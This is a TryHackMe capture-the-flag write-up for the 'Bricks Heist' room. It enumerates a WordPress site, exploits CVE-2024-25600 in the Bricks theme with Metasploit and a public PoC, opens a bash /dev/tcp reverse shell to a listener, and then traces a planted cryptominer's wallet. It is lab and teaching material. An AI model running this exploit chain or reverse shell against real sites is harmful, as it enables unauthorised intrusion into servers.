# TryHackMe - Bricks Heist

## Scenario
A WordPress site running the **Bricks** page builder theme is exposed to the network. The goal is to gain a foothold, capture the flag, and — as it turns out — uncover a live cryptomining backdoor already planted on the box.

---

## 1. Reconnaissance

Ran a full-port `nmap` scan first, since the initial pass on just the top ports can miss services like MySQL:

```bash
nmap -p- -Pn 10.49.165.111
```

**Results:**

| Port | Service |
|------|---------|
| 22/tcp | ssh |
| 80/tcp | http |
| 443/tcp | https |
| 3306/tcp | mysql |

Browsing to `http://10.49.165.111` loads a minimal page titled **"Brick by Brick!"**

### Finding the real hostname

Opening the browser's **Inspector** on the page revealed a `dns-prefetch` link in the `<head>` pointing at `//bricks.thm`, along with an RSS feed URL referencing `https://bricks.thm/feed/`. In the inspect section of this page, this gave away the hostname behind the IP.

Added it to `/etc/hosts`:

```
10.49.165.111    bricks.thm
```

Reloading via the hostname resolved a full WordPress front page (title: "Brick by Brick").

---

## 2. Web Enumeration

### Directory brute-forcing

```bash
gobuster dir -u https://bricks.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -k
```

This confirmed a standard WordPress layout: `/wp-content`, `/wp-admin`, `/wp-includes`, `/wp-login.php` (redirect), plus a `/phpmyadmin` directory.

### Extension fuzzing

```bash
ffuf -u https://bricks.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .txt,.php,.html
```

Turned up the rest of the standard WordPress file set (`wp-login.php`, `wp-config.php`, `xmlrpc.php`, `readme.html`, `robots.txt`, etc.) plus the `/phpmyadmin/` login page — reachable, but useless without database credentials, so it was set aside.

`robots.txt` was the standard WordPress default:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

### WPScan fingerprinting

```bash
wpscan --url https://bricks.thm --disable-tls-checks --enumerate u,vp,vt --api-token <redacted>
```

**Findings:**
- WordPress version: **6.5**
- Theme: **Bricks v1.9.5**
- Vulnerabilities including **CVE-2024-25600 (Unauthenticated RCE)**
- Username enumerated: `administrator`

The 14 WordPress-core vulnerabilities WPScan listed were all fixed in later point releases and not the way in — the standout was the theme-level finding: **Bricks < 1.9.6.1 — Unauthenticated Remote Code Execution**.

---

## 3. Exploitation — CVE-2024-25600

Per Rapid7's write-up, this vulnerability lets an unauthenticated attacker execute arbitrary PHP by leveraging a **nonce leakage** to bypass authentication and then abusing the theme's use of `eval()`. Full details: [rapid7.com — Unauthenticated RCE in Bricks Builder Theme](https://www.rapid7.com/db/modules/exploit/multi/http/wp_bricks_builder_rce/).

### Option A — Metasploit

```
use exploit/multi/http/wp_bricks_builder_rce
set RHOSTS bricks.thm
set RPORT 443
set SSL true
set LPORT 4444
show options
run
```

### Option B — Public PoC (used here)

Downloaded a public PoC script (`CVE-2024-25600.py`, by K3ysTr0K3R) and set up a virtual environment for its dependencies:

```bash
python3 -m venv venv
source venv/bin/activate
pip install alive-progress requests bs4 rich prompt_toolkit
```

Ran it against the target:

```bash
python3 CVE-2024-25600.py -u https://bricks.thm
```

```
[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> whoami
apache
Shell> pwd
/data/www/default
```

This confirmed unauthenticated RCE, landing as the `apache` user directly through the script's own interactive shell.

---

## 4. Upgrading to a Full Reverse Shell

The PoC's built-in shell is convenient but limited (it makes one HTTP request per command), so it was used to launch a proper reverse shell:

```bash
bash -c "sh -i >& /dev/tcp/192.168.128.15/4444 0>&1"
```

*(Sending this causes the PoC's own HTTP client to hang/error out waiting on a response that never comes back over that connection — expected, since the shell it triggered is now piped to the listener instead.)*

Caught it with a listener on the attack box (`rlwrap` adds readline support — arrow-key history, tab completion, etc. — that a bare `nc` shell lacks):

```bash
rlwrap nc -lvnp 4444
```

```
listening on [any] 4444 ...
connect to [192.168.128.15] from (UNKNOWN) [10.49.147.130] 51644
can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
apache@ip-10-49-147-130:/data/www/default$
```

---

## 5. Capturing the Flag

```bash
ls
```
```
650c844110baced87e1606453b93f22a.txt
index.php  kod  license.txt  phpmyadmin  readme.html
wp-activate.php  wp-admin  wp-blog-header.php  ...
```

```bash
cat 650c844110baced87e1606453b93f22a.txt
```
```
THM{****}
```

---

## 6. Bonus: Hunting a Live Cryptominer

While enumerating the box further, running services were checked:

```bash
systemctl | grep running
```

One entry stood out immediately — `ubuntu.service`, described (oddly) as **"TRYHACK3M"** rather than anything Ubuntu-related:

```bash
systemctl status ubuntu.service
```
```
● ubuntu.service - TRYHACK3M
   Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
   Active: active (running)
 Main PID: 2944 (nm-inet-dialog)
   CGroup: /system.slice/ubuntu.service
           ├─2944 /lib/NetworkManager/nm-inet-dialog
           └─2945 /lib/NetworkManager/nm-inet-dialog
```

A binary named `nm-inet-dialog`, disguised inside `/lib/NetworkManager/` and enabled to survive reboots as a systemd service, is a classic persistence pattern for a backdoor or miner. Its accompanying log/config file confirmed it:

```bash
cat /lib/NetworkManager/inet.conf
```
```
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c...
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
```

This confirms `nm-inet-dialog` is a live **Bitcoin miner** masquerading as a NetworkManager component.

### Decoding the payout wallet

The `ID:` value is layered encoding — hex, then base64 twice over:

```bash
echo '<hex string>' | xxd -r -p
# → base64 string
echo '<that>' | base64 -d
# → another base64 string
echo '<that>' | base64 -d
# → bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

This resolved to a Bitcoin wallet address: **`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`**

A lookup on Blockonomics showed this wallet has moved a serious amount of money — **over $1.18M USD (15.53 BTC)** across its transaction history — confirming it's a real, actively-used mining payout address, not a throwaway.

### Following the money

One of the wallet's larger outgoing transactions (~$307,783 at the time) led to another address: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`. A quick search turned up something notable: this address appears on the **U.S. Treasury OFAC Specially Designated Nationals (SDN) list**, added in a February 2024 designation tied to an individual sanctioned for affiliation with the **LockBit ransomware group**.

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | `nmap -p- -Pn` |
| Hostname discovery | Browser inspector (`dns-prefetch` link) → `/etc/hosts` |
| Enumeration | `gobuster`, `ffuf`, `wpscan` |
| Vulnerability ID | WPScan → Bricks theme v1.9.5 → CVE-2024-25600 |
| Initial access | Public PoC / Metasploit exploit for CVE-2024-25600 → `apache` shell |
| Foothold upgrade | Bash one-liner reverse shell → `rlwrap nc` listener → `pty` upgrade |
| Flag | `/data/www/default/650c844110baced87e1606453b93f22a.txt` |
| Threat hunting | Disguised `ubuntu.service` → `nm-inet-dialog` cryptominer → wallet traced to an OFAC-sanctioned, LockBit-linked address |

### Flag
```
THM{****}
```
